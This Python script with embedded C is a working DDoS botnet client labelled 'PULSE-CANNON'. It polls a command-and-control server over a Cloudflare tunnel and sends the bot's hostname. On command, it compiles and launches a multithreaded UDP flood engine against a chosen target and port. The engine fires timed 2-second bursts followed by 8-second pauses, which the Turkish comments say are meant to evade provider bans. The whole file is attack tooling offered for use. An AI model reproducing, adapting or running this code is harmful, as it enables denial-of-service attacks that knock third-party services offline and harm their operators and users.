#!/usr/bin/env python3
"""
  ENI & LO — v11 PULSE-CANNON MODE (2026)
  =======================================
  - Synchronized Burst Protocol.
  - Vurma Evresi: 2 saniye boyunca 128 thread aynı anda %100 yüklenir.
  - Dinlenme Evresi: 8 saniye tam sessizlik (Oracle NIC buffer'ları boşaltır, banı engeller).
  - Sonuç: Grafikte anlık devasa Everest dağları (Spike) yaratır.
"""

import socket, json, threading, time, urllib.request, platform
import sys, multiprocessing, random, os, subprocess, signal

DEFAULT_C2   = "marilyn-superior-bunny-possess.trycloudflare.com"
DEFAULT_PORT = 443
CPU_CORES    = multiprocessing.cpu_count()

# ============================================================================
#  v11 PULSE-CANNON C-ENGINE
# ============================================================================
C_ENGINE = r"""
#define _GNU_SOURCE
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/time.h>

#define BATCH 1024
#define PKTSIZE 1472
#define SOCKS_PER_TH 4

static volatile int g_run = 1;
static char g_ip[64];
static int g_port;

void on_sig(int s) { g_run = 0; }

long long current_timestamp() {
    struct timeval te; 
    gettimeofday(&te, NULL); 
    long long milliseconds = te.tv_sec*1000LL + te.tv_usec/1000; 
    return milliseconds;
}

void* pulsecannon_thread(void* arg) {
    int tid = *(int*)arg;
    free(arg);

    int fds[SOCKS_PER_TH];
    int buf = 16 * 1024 * 1024; // 16MB buffer

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port = htons(g_port);
    inet_pton(AF_INET, g_ip, &dst.sin_addr);

    for(int i=0; i<SOCKS_PER_TH; i++){
        fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(fds[i] >= 0){
            int flags = fcntl(fds[i], F_GETFL, 0);
            fcntl(fds[i], F_SETFL, flags | O_NONBLOCK);
            setsockopt(fds[i], SOL_SOCKET, SO_SNDBUF, &buf, sizeof(buf));
        }
    }

    char payload[PKTSIZE];
    memset(payload, 'P', PKTSIZE); // P for Pulse

    struct iovec iov[BATCH];
    struct mmsghdr msg[BATCH];
    
    for (int i = 0; i < BATCH; i++) {
        iov[i].iov_base = payload;
        iov[i].iov_len = PKTSIZE;
        memset(&msg[i], 0, sizeof(msg[i]));
        msg[i].msg_hdr.msg_name = &dst;
        msg[i].msg_hdr.msg_namelen = sizeof(dst);
        msg[i].msg_hdr.msg_iov = &iov[i];
        msg[i].msg_hdr.msg_iovlen = 1;
    }

    int cur = 0;
    while (g_run) {
        // --- 1. VURMA EVRESI (BURST PHASE) ---
        // 2 saniye boyunca aralıksız, ölümüne paket bas
        long long start_ms = current_timestamp();
        while (g_run && (current_timestamp() - start_ms < 2000)) {
            if(fds[cur] >= 0) {
                sendmmsg(fds[cur], msg, BATCH, 0);
            }
            cur = (cur + 1) % SOCKS_PER_TH;
        }
        
        // --- 2. DINLENME EVRESI (RECHARGE PHASE) ---
        // 8 saniye bekle, Oracle NIC buffer'ları boşalsın, tokenlar dolsun
        int slept = 0;
        while (g_run && slept < 80) { // 80 * 100ms = 8 seconds
            usleep(100000); 
            slept++;
        }
    }
    
    for(int i=0; i<SOCKS_PER_TH; i++){
        if(fds[i] >= 0) close(fds[i]);
    }
    return NULL;
}

int main(int argc, char** argv) {
    if (argc < 4) return 1;
    strncpy(g_ip, argv[1], sizeof(g_ip)-1);
    g_port = atoi(argv[2]);
    int threads = atoi(argv[3]);
    
    signal(SIGTERM, on_sig); 
    signal(SIGINT, on_sig);

    pthread_t thr[128];
    for (int i = 0; i < threads; i++) {
        int* id = malloc(sizeof(int));
        *id = i;
        pthread_create(&thr[i], NULL, pulsecannon_thread, id);
    }
    
    for (int i = 0; i < threads; i++) {
        pthread_join(thr[i], NULL);
    }
    
    return 0;
}
"""

def compile_engine(cwd):
    if platform.system() != "Linux": return None
    binpath = os.path.join(cwd, "pulsecannon_engine")
    srcpath = os.path.join(cwd, "pulsecannon_engine.c")
    with open(srcpath, "w") as f: f.write(C_ENGINE)
    subprocess.run(["gcc","-O3","-march=native","-funroll-loops",srcpath,"-o",binpath,"-lpthread"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    os.chmod(binpath, 0o755)
    return binpath

def bot_process(wid, c2h, c2p, workdir):
    bid = f"BOT-{platform.node()}-{wid}-{random.randint(1000,9999)}"
    proto = "https" if c2p == 443 else "http"
    poll = f"{proto}://{c2h}/poll"

    engine_bin = compile_engine(workdir)
    engine_proc = None
    last_aid = None
    
    print(f"\033[94m[PULSE-{wid:02d}] Charging capacitors...\033[0m")

    while True:
        try:
            body = json.dumps({"bot_id": bid, "hostname": platform.node(), "os": "Linux PULSECANNON"}).encode()
            req = urllib.request.Request(poll, data=body, headers={"Content-Type":"application/json"})
            with urllib.request.urlopen(req, timeout=3) as resp:
                cmd = json.loads(resp.read().decode())
                act = cmd.get("action")
                aid = cmd.get("attack_id")

                if act == "ATTACK" and aid != last_aid:
                    if engine_proc: 
                        try: engine_proc.kill() 
                        except: pass
                    
                    target = cmd.get("target")
                    port = int(cmd.get("port", 80))
                    threads = 4 # 32 proc * 4 = 128 threads
                    
                    print(f"\033[91m[!] PULSE-{wid:02d} FIRING 10-SECOND BURSTS AT {target}:{port} !!\033[0m")
                    engine_proc = subprocess.Popen([engine_bin, target, str(port), str(threads)])
                    last_aid = aid
                    
                elif act in ("STOP", "IDLE"):
                    if engine_proc:
                        try: engine_proc.kill()
                        except: pass
                        engine_proc = None
                        last_aid = None
                        print(f"\033[92m[PULSE-{wid:02d}] Holding fire.\033[0m")
        except:
            pass
        time.sleep(0.5 + random.uniform(0, 0.5))

def main():
    print(f"\033[91m  ☢  ENI & LO — v11 PULSE-CANNON MODE  ☢\033[0m\n")
    host = DEFAULT_C2
    port = DEFAULT_PORT
    if len(sys.argv) > 1: host = sys.argv[1]
    
    workdir = os.getcwd()
    compile_engine(workdir)
    
    procs = []
    # 32 processes
    count = CPU_CORES if CPU_CORES > 0 else 32
    for i in range(count):
        p = multiprocessing.Process(target=bot_process, args=(i+1, host, port, workdir), daemon=True)
        p.start()
        procs.append(p)
        time.sleep(0.05)
        
    try:
        while True: time.sleep(60)
    except:
        for p in procs: p.kill()

if __name__ == "__main__":
    main()
